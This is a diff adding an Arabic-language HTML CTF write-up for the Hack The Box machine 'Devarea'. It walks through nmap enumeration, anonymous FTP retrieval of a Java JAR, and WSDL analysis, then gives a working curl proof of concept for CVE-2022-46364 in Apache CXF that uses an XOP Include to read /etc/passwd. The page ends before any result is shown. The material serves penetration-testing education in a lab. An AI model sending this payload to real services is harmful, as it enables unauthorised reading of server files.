@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="theme-color" content="#07110d">
+  <meta name="color-scheme" content="dark light">
+  <meta name="description" content="تقرير CTF تقني لتحدي Devarea HTB Write-up على منصة Hack The Box.">
+  <title>Devarea HTB Write-up | Ft7y.Sec</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Tajawal:wght@300;400;500;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="icon" href="../avatar.png" type="image/png">
+</head>
+<body>
+  <a class="skip-link" href="#main-content">تخطي إلى المحتوى</a>
+  <div class="scroll-progress" id="scroll-progress" aria-hidden="true"></div>
+  <div class="page-noise" aria-hidden="true"></div>
+  <canvas id="particles-canvas"></canvas>
+  <header class="navbar" id="navbar">
+    <div class="logo"><a href="../index.html#home">Ft7y<span>.Sec</span></a></div>
+    <nav class="nav-links" id="nav-menu" aria-label="التنقل الرئيسي"><ul>
+      <li><a href="../index.html#home">الرئيسية</a></li>
+      <li><a href="../pentest.html">اختبار الاختراق</a></li>
+      <li><a href="../appsec.html">أمن التطبيقات</a></li>
+      <li><a href="../automation.html">البرمجة والأتمتة</a></li>
+      <li><a href="../systems-labs.html">الأنظمة والمعامل</a></li>
+      <li><a href="../writeups.html">CTF Write-ups</a></li>
+      <li><a href="../index.html#contact">تواصل معي</a></li>
+    </ul></nav>
+    <div class="nav-actions">
+      <button id="theme-toggle" class="btn-secondary" type="button" title="تبديل الوضع" aria-label="تبديل الوضع"><i class="fa-solid fa-moon"></i></button>
+      <button class="mobile-toggle" id="mobile-toggle" type="button" aria-label="القائمة"><i class="fa-solid fa-bars"></i></button>
+    </div>
+  </header>
+  <main id="main-content" class="subpage-container ctf-report-page">
+    <article class="ctf-report-article">
+      <header class="subpage-hero ctf-report-hero" data-aos="fade-up">
+        <nav class="breadcrumb-nav" aria-label="مسار التنقل"><a href="../index.html"><i class="fa-solid fa-house"></i> الرئيسية</a><span class="sep">/</span><a href="index.html">تقارير CTF</a><span class="sep">/</span><span class="current">Devarea HTB Write-up</span></nav>
+        <div class="writeup-header"><span class="platform-tag htb"><i class="fa-solid fa-cube"></i> Hack The Box</span><span class="ctf-directory-label"><i class="fa-solid fa-shield-halved"></i> بيئة تدريبية مصرح بها</span></div>
+        <h1 class="subpage-hero-title">Devarea HTB Write-up</h1>
+        <p class="subpage-hero-desc">توثيق تقني محفوظ من المصدر الأصلي في Notion، يشمل الخطوات والأوامر والنتائج ولقطات الشاشة المتاحة.</p>
+        <a href="index.html" class="btn-outline ctf-back-link"><i class="fa-solid fa-arrow-right"></i> العودة إلى تقارير CTF</a>
+      </header>
+      <div class="ctf-report-content" data-aos="fade-up"><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-1.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><h4>This will be the devarea machine penetration test report   we in 12 مايو 2026 10:48 م</h4><h3><strong><em>enumeration</em></strong></h3><h4>*<em>by </em><strong><em>using </em></strong><em> </em><strong><em>sudo nmap -A \&lt;target IP \&gt;</em></strong><em>  we have :</em>*</h4><p>هنا قمت بتشغيل الأداة بصلاحيات الجذر <strong>sudo</strong> (الـ Root)، وهو أمر ضروري في Nmap لتفعيل الخيارات المتقدمة مثل فحص أنظمة التشغيل وإرسال حزم بيانات مخصصة (Raw Packets).</p><p><strong><code dir="ltr">-A</code></strong><strong>:</strong> هذا الخيار يُسمى <strong>Aggressive scan</strong> (الفحص الهجومي/المكثف)، وهو يدمج 4 أشياء معاً:1</p><ul class="ctf-report-list"><li>فحص نظام التشغيل (OS detection).</li><li>فحص إصدارات الخدمات (Version detection).</li><li>تشغيل الاسكربتات الافتراضية الذكية (Script scanning).</li><li>تتبع مسار الحزم (Traceroute).</li></ul><aside class="ctf-callout"><p>focus on red lines</p></aside><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>─$ sudo nmap -A 10.129.244.208   
+[sudo] password for kali: 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-16 00:04 +0300
+Nmap scan report for 10.129.244.208
+Host is up (0.16s latency).
+Not shown: 994 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.16.38
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
+|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.58
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Did not follow redirect to http://devarea.htb/
+8080/tcp open  http    Jetty 9.4.27.v20200227
+|_http-title: Error 404 Not Found
+|_http-server-header: Jetty(9.4.27.v20200227)
+8500/tcp open  http    Golang net/http server
+|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 500 Internal Server Error
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Fri, 15 May 2026 21:04:49 GMT
+|     Content-Length: 64
+|     This is a proxy server. Does not respond to non-proxy requests.
+|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.0 500 Internal Server Error
+|     Content-Type: text/plain; charset=utf-8
+|     X-Content-Type-Options: nosniff
+|     Date: Fri, 15 May 2026 21:04:31 GMT
+|     Content-Length: 64
+|_    This is a proxy server. Does not respond to non-proxy requests.
+8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Hoverfly Dashboard
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8500-TCP:V=7.98%I=7%D=5/16%Time=6A078A5E%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request&quot;)%r(GetRequest,E9,&quot;HTTP/1\.0\x20500\x20Internal\x20Server\x20
+SF:Error\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Typ
+SF:e-Options:\x20nosniff\r\nDate:\x20Fri,\x2015\x20May\x202026\x2021:04:31
+SF:\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20ser
+SF:ver\.\x20Does\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n&quot;)%r(
+SF:HTTPOptions,E9,&quot;HTTP/1\.0\x20500\x20Internal\x20Server\x20Error\r\nCont
+SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nX-Content-Type-Options:\x2
+SF:0nosniff\r\nDate:\x20Fri,\x2015\x20May\x202026\x2021:04:31\x20GMT\r\nCo
+SF:ntent-Length:\x2064\r\n\r\nThis\x20is\x20a\x20proxy\x20server\.\x20Does
+SF:\x20not\x20respond\x20to\x20non-proxy\x20requests\.\n&quot;)%r(RTSPRequest,6
+SF:7,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x
+SF:20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%
+SF:r(Help,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+SF:quest&quot;)%r(SSLSessionReq,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConte
+SF:nt-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\
+SF:n400\x20Bad\x20Request&quot;)%r(FourOhFourRequest,E9,&quot;HTTP/1\.0\x20500\x20In
+SF:ternal\x20Server\x20Error\r\nContent-Type:\x20text/plain;\x20charset=ut
+SF:f-8\r\nX-Content-Type-Options:\x20nosniff\r\nDate:\x20Fri,\x2015\x20May
+SF:\x202026\x2021:04:49\x20GMT\r\nContent-Length:\x2064\r\n\r\nThis\x20is\
+SF:x20a\x20proxy\x20server\.\x20Does\x20not\x20respond\x20to\x20non-proxy\
+SF:x20requests\.\n&quot;)%r(LPDString,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\
+SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
+SF:r\n\r\n400\x20Bad\x20Request&quot;)%r(SIPOptions,67,&quot;HTTP/1\.1\x20400\x20Bad
+SF:\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnect
+SF:ion:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(Socks5,67,&quot;HTTP/1\.1\x20
+SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
+SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;);
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5
+OS details: Linux 5.0 - 5.14
+Network Distance: 2 hops
+Service Info: Host: _; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT       ADDRESS
+1   179.27 ms 10.10.16.1
+2   72.46 ms  10.129.244.208
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 47.26 seconds</code></pre></section><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-2.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-3.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-4.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><h4>المنفذ 21: خدمة نقل الملفات (FTP)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub</code></pre></section><p>المنفذ 21 يعمل ببروتوكول TCP وهو مفتوح (<strong>open</strong>). الخدمة هي <strong>FTP</strong> (نقل الملفات)، والبرنامج المسؤول عنها وإصداره هو <strong>vsftpd 3.0.5</strong>.</p><p>في السطر الثالث هنا قام الـ Script الافتراضي لـ Nmap باكتشاف ثغرة في الإعدادات (Misconfiguration) تسمى <strong>Anonymous FTP login</strong>. تعني أن أي شخص يمكنه الدخول إلى السيرفر بدون اسم مستخدم وكلمة مرور (أو باستخدام اسم anonymous). ويوضح وجود مجلد باسم <code dir="ltr">pub</code> وصلاحياته تسمح بالقراءة والدخول (<code dir="ltr">drwxr-xr-x</code>). كـ Tester، خطوتك التالية هي الدخول فوراً عبر الـ Terminal لرؤية ما بداخل هذا المجلد!</p><h4>المنفذ 22: خدمة الاتصال الآمن (SSH)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>22/tcp  open  ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 83:13:6b:a1:9b:28:fd:bd:5d:2b:ee:03:be:9c:8d:82 (ECDSA)
+|_  256 0a:86:fa:65:d1:20:b4:3a:57:13:d1:1a:c2:de:52:78 (ED25519)</code></pre></section><ul class="ctf-report-list"><li>منفذ التحكم عن بعد المشفر <strong>SSH</strong> مفتوح. يعمل بإصدار <strong>OpenSSH 9.6p1</strong>.</li><li>نظام التشغيل الخاص بالهدف تم كشفه هنا بدقة، مكتوب <strong>Ubuntu Linux</strong>. البرامج دائماً تسرب اسم نظام التشغيل الأساسي.</li></ul><h4>المنفذ 80: خادم الويب الافتراضي (HTTP)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>80/tcp   open  http    Apache httpd 2.4.58
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Did not follow redirect to http://devarea.htb/</code></pre></section><p>منفذ مواقع الويب العادي مفتوح، ويعمل بواسطة أشهر خادم ويب وهو <strong>Apache</strong> بإصدار <strong>2.4.58</strong> على بيئة <strong>Ubuntu على الرابط </strong> <a href="http://devarea.htb/" target="_blank" rel="noopener noreferrer">http://devarea.htb</a><a href="http://devarea.htb/" target="_blank" rel="noopener noreferrer">/</a>   يجب ان نقوم تسجيله في ملف المضيفين &lt;br&gt;عن طريق الام التالي :</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>echo &#39;&lt;Target-IP&gt; devarea.htb&#39; | sudo tee -a /etc/hosts</code></pre></section><p>لن تفتح معك هذه الصفحة في المتصفح إلا إذا قمت بإضافة هذا الـ Domain والـ IP في ملف الـ hosts</p><h4>المنفذ 8080: خادم ويب بديل (HTTP - Jetty)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>8080/tcp open  http    Jetty 9.4.27.v20200227
+|_http-title: Error 404 Not Found
+|_http-server-header: Jetty(9.4.27.v20200227)</code></pre></section><p>هناك خادم ويب آخر يعمل على المنفذ الشهير 8080، ولكنه ليس Apache، بل هو خادم ويب مبني على الجافا يسمى <strong>Jetty</strong> بإصدار قديم نسبياً (من عام 2020)السيرفر رد بـ &quot;الصفحة غير موجودة&quot;، مما يعني أن المسار الرئيسي فارغ، ويحتاج  لعملية تخمين للمسارات والمجلدات (Directory Brute Forcing) باستخدام أدوات مثل <code dir="ltr">Gobuster</code> أو <code dir="ltr">Dirbuster</code></p><p>&lt;br&gt;&lt;br&gt;</p><p>&lt;br&gt;&lt;br&gt;</p><h4>المنفذ 8500: خادم ويب مخصص بلغة Go (Golang)</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>8500/tcp open  http    Golang net/http server
+|_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8).
+| fingerprint-strings: 
+...
+|     This is a proxy server. Does not respond to non-proxy requests.</code></pre></section><p>هذا المنفذ يعمل كخادم ويب مبرمج بلغة <strong>Go</strong> (Golang)، ولا يحتوي على عنوان للموقع (Title)، والبيانات المرجعة هي نصوص عادية (text/plain)</p><ul class="ctf-report-list"><li>الجزء الطويل المليء بالرموز الست عشرية (Hexadecimal) بالأسفل هو <strong>Fingerprint</strong> (بصمة)، وهو محاولة Nmap لتخمين ما يفعله المنفذ لأن الخدمة غير معيارية.</li><li>الجملة الأهم التي استخرجتها الأداة هي: <strong><code dir="ltr">This is a proxy server. Does not respond to non-proxy requests.</code></strong></li><li>هذا يعني أن المنفذ 8500 يعمل كـ <strong>Proxy Server</strong> (سيرفر وكيل)، ويرفض الاستجابة للطلبات العادية، مما يفتح لك باباً للتفكير في ثغرات مثل الـ Server-Side Request Forgery (SSRF) أو إساءة استخدام البروكسي لاختراق الشبكة الداخلية.&lt;br&gt;&lt;br&gt;</li></ul><h4>المنفذ 8888: لوحة تحكم  Hoverfly</h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>8888/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+|_http-title: Hoverfly Dashboard</code></pre></section><ul class="ctf-report-list"><li>منفذ ويب آخر يعمل بلغة Go، والـ Title الخاص به واضح جداً: <strong>Hoverfly Dashboard</strong>.</li><li>أداة <strong>Hoverfly</strong> هي أداة مفتوحة المصدر تُستخدم لمحاكاة وتطوير واجهات برمجة التطبيقات (API Simulation/Mocking). وجود لوحة تحكم (Dashboard) مفتوحة بدون كلمة مرور قد تمنحك تحكماً كاملاً أو معلومات حساسة جداً عن الـ APIs الخاصة بالموقع.</li></ul><p>-</p><h2>execution</h2><h4>Targeting FTP</h4><h4><strong>الهدف الأول سهل ومباشر:</strong> اتصل بـ FTP كـ Anonymous عبر <code dir="ltr">ftp@anonymous@10.129.244.208</code> ثم اكتب اسم المستخدم <code dir="ltr">anonymous</code> واضغط انتر بدون باسوورد، وتفقد ما بداخل مجلد <code dir="ltr">pub</code></h4><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">python</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>─(kali㉿kali)-[~/Downloads]
+└─$ ftp anonymous@10.129.244.208
+Connected to 10.129.244.208.
+220 (vsFTPd 3.0.5)
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+229 Entering Extended Passive Mode (|||48300|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 pub
+226 Directory send OK
+ftp&gt; pwd
+Remote directory: /pub
+ls -la
+229 Entering Extended Passive Mode (|||43227|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Sep 22  2025 .
+drwxr-xr-x    3 ftp      ftp          4096 Sep 22  2025 ..
+-rw-r--r--    1 ftp      ftp       6445030 Sep 22  2025 employee-service.jar
+226 Directory send OK.
+ftp&gt; get employee-service.jar
+local: employee-service.jar remote: employee-service.jar
+229 Entering Extended Passive Mode (|||42837|)
+150 Opening BINARY mode data connection for employee-service.jar (6445030 bytes).
+100% |***************************************************************|  6293 KiB    1.69 MiB/s    00:00 ETA
+226 Transfer complete.
+6445030 bytes received in 00:03 (1.62 MiB/s)
+ftp&gt; exit
+221 Goodbye.</code></pre></section><p>لقد قمت بتحميل ملف بحجم <strong>6.2 ميجابايت</strong> تقريباً باسم <code dir="ltr">employee-service.jar</code> من مستودع الـ FTP. هذا الملف يمثل تطبيقاً مكتوباً بلغة <strong>Java</strong> (غالباً هو ملف مطور باستخدام إطار عمل <strong>Spring Boot</strong> لأنه يعمل كـ Microservice لإدارة الموظفين)</p><p>اقترح  استخدام اداة jd-gui  لعرض ملفات ال jar   بدون الحاجة الى فك ضغط الملف وايضا  لعرض الاكواد كما كتبها المبرمج  بدون رموز غريبة</p><p>الـ JAR بيورينا الـ backend code بدون ما نعمل reverse engineering معقد. CXF version قديم → CVE-2022-463</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-5.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><p>عنوان ملف ال wsdl  <a href="http://localhost:8080/employeeservice?wsdl" target="_blank" rel="noopener noreferrer">http://\&lt;target-ip\&gt;:8080/employeeservice?wsdl</a></p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-6.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">java</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>return greeting + &quot;. Department: &quot; + report.getDepartment() + &quot;. Content: &quot; + report.getContent();</code></pre></section><p>السيرفر يأخذ محتويات النصوص التي نرسلها ويعيد طباعتها لنا في الاستجابة! هذا يعني أنه إذا نجحنا في حقن كيان خارجي (Entity) داخل حقل مثل <code dir="ltr">content</code> أو <code dir="ltr">department</code>، سيقوم السيرفر بقراءة الملف الداخلي الذي نطلبه ويطبعه لنا مباشرة في النتيجة (In-band XXE)</p><p>بعد فحص الملفات الثغرة المحتملة هنا (The Vulnerability Concept):</p><p>بما أننا نتعامل مع خدمة ويب تستقبل تقريرًا (<code dir="ltr">Report</code>) يحتوي على نصوص ويتم معالجتها بواسطة مكتبة <strong>Apache CXF</strong> أو بيئة الجافا، فإن الهدف الأساسي هنا هو محاولة إرسال طلب تلاعب (Malicious SOAP Request) يحتوي على حمولة (Payload) تستهدف دمج النصوص أو استغلال ثغرة حقن</p><figure class="ctf-report-figure"><img src="../assets/images/ctfs/devarea-7.png" alt="لقطة شاشة من تقرير Devarea HTB Write-up" loading="lazy"><figcaption>لقطة شاشة من تقرير Devarea HTB Write-up</figcaption></figure><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">xml</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>&lt;wsdl:definitions name=&quot;EmployeeServiceService&quot; targetNamespace=&quot;http://devarea.htb/&quot;&gt;
+&lt;wsdl:types&gt;
+&lt;xs:schema elementFormDefault=&quot;unqualified&quot; targetNamespace=&quot;http://devarea.htb/&quot; version=&quot;1.0&quot;&gt;
+&lt;xs:element name=&quot;submitReport&quot; type=&quot;tns:submitReport&quot;/&gt;
+&lt;xs:element name=&quot;submitReportResponse&quot; type=&quot;tns:submitReportResponse&quot;/&gt;
+&lt;xs:complexType name=&quot;submitReport&quot;&gt;
+&lt;xs:sequence&gt;
+&lt;xs:element minOccurs=&quot;0&quot; name=&quot;arg0&quot; type=&quot;tns:report&quot;/&gt;
+&lt;/xs:sequence&gt;
+&lt;/xs:complexType&gt;
+&lt;xs:complexType name=&quot;report&quot;&gt;
+&lt;xs:sequence&gt;
+&lt;/xs:sequence&gt;
+&lt;/xs:complexType&gt;
+&lt;xs:complexType name=&quot;submitReportResponse&quot;&gt;
+&lt;xs:sequence&gt;
+&lt;xs:element minOccurs=&quot;0&quot; name=&quot;return&quot; type=&quot;xs:string&quot;/&gt;
+&lt;/xs:sequence&gt;
+&lt;/xs:complexType&gt;
+&lt;/xs:schema&gt;
+&lt;/wsdl:types&gt;
+&lt;wsdl:message name=&quot;submitReport&quot;&gt;
+&lt;/wsdl:message&gt;
+&lt;wsdl:message name=&quot;submitReportResponse&quot;&gt;
+&lt;wsdl:part element=&quot;tns:submitReportResponse&quot; name=&quot;parameters&quot;&gt; &lt;/wsdl:part&gt;
+&lt;/wsdl:message&gt;
+&lt;wsdl:portType name=&quot;EmployeeService&quot;&gt;
+&lt;wsdl:operation name=&quot;submitReport&quot;&gt;
+&lt;wsdl:input message=&quot;tns:submitReport&quot; name=&quot;submitReport&quot;&gt; &lt;/wsdl:input&gt;
+&lt;wsdl:output message=&quot;tns:submitReportResponse&quot; name=&quot;submitReportResponse&quot;&gt; &lt;/wsdl:output&gt;
+&lt;/wsdl:operation&gt;
+&lt;/wsdl:portType&gt;
+&lt;wsdl:binding name=&quot;EmployeeServiceServiceSoapBinding&quot; type=&quot;tns:EmployeeService&quot;&gt;
+&lt;soap:binding style=&quot;document&quot; transport=&quot;http://schemas.xmlsoap.org/soap/http&quot;/&gt;
+&lt;wsdl:operation name=&quot;submitReport&quot;&gt;
+&lt;soap:operation soapAction=&quot;&quot; style=&quot;document&quot;/&gt;
+&lt;wsdl:input name=&quot;submitReport&quot;&gt;
+&lt;soap:body use=&quot;literal&quot;/&gt;
+&lt;/wsdl:input&gt;
+&lt;wsdl:output name=&quot;submitReportResponse&quot;&gt;
+&lt;/wsdl:output&gt;
+&lt;/wsdl:operation&gt;
+&lt;/wsdl:binding&gt;
+&lt;wsdl:service name=&quot;EmployeeServiceService&quot;&gt;
+&lt;wsdl:port binding=&quot;tns:EmployeeServiceServiceSoapBinding&quot; name=&quot;EmployeeServicePort&quot;&gt;
+&lt;soap:address location=&quot;http://10.129.244.208:8080/employeeservice&quot;/&gt;
+&lt;/wsdl:port&gt;</code></pre></section><h4>Critical Observations</h4><p>&lt;table header-row=&quot;true&quot;&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;Finding&lt;/td&gt;</p><p>&lt;td&gt;Implication&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;<strong>Apache CXF</strong> JAX-WS implementation&lt;/td&gt;</p><p>&lt;td&gt;SOAP web service framework&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;Running on <strong>Jetty 9.4.27</strong>&lt;/td&gt;</p><p>&lt;td&gt;Released in 2020 - old and vulnerable&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;Endpoint: <code dir="ltr">/employeeservice</code>&lt;/td&gt;</p><p>&lt;td&gt;Exposed SOAP service&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;tr&gt;</p><p>&lt;td&gt;WSDL available&lt;/td&gt;</p><p>&lt;td&gt;Service definition publicly accessible&lt;/td&gt;</p><p>&lt;/tr&gt;</p><p>&lt;/table&gt;</p><h3>استغلال الثغرة (CVE-2022-46364) — File Read</h3><p>عبر البحث وجت هذا ال poc  واستخدمته :</p><section class="ctf-code-block"><div class="ctf-code-toolbar"><span dir="ltr">bash</span><button type="button" class="ctf-copy-code" aria-label="نسخ الكود"><i class="fa-regular fa-copy" aria-hidden="true"></i></button></div><pre dir="ltr"><code>curl -s -X POST http://10.129.244.208:8080/employeeservice \
+-H &quot;Content-Type: multipart/related; type=\&quot;application/xop+xml\&quot;; boundary=----boundary&quot; \
+--data-binary $&#39;------boundary\r\nContent-Type: application/xop+xml; charset=UTF-8; type=&quot;text/xml&quot;\r\nContent-ID: &lt;root&gt;\r\n\r\n&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:dev=&quot;http://devarea.htb/&quot; xmlns:xop=&quot;http://www.w3.org/2004/08/xop/include&quot;&gt;\r\n  &lt;soapenv:Body&gt;\r\n    &lt;dev:submitReport&gt;\r\n      &lt;arg0&gt;\r\n        &lt;content&gt;\r\n          &lt;xop:Include href=&quot;file:///etc/passwd&quot;/&gt;\r\n        &lt;/content&gt;\r\n      &lt;/arg0&gt;\r\n    &lt;/dev:submitReport&gt;\r\n  &lt;/soapenv:Body&gt;\r\n&lt;/soapenv:Envelope&gt;\r\n------boundary--&#39;
+
+# result  النتيجة ⬇️⬇️            
+
